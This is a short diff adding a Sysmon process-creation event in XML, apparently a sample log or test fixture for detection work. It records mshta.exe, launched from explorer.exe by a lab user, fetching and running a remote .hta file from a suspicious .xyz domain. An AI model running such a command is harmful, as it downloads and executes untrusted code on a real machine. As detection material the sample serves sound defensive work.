@@ -1,0 +1,9 @@
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+  <System><Provider Name='Microsoft-Windows-Sysmon'/><EventID>1</EventID></System>
+  <EventData>
+    <Data Name='Image'>C:\Windows\System32\mshta.exe</Data>
+    <Data Name='CommandLine'>mshta.exe http://example-long-subdomain-aaaaaaaaaaaaaaaaaaaaaaa.xyz/promo.hta</Data>
+    <Data Name='ParentImage'>C:\Windows\explorer.exe</Data>
+    <Data Name='User'>LAB\User1</Data>
+  </EventData>
+</Event>
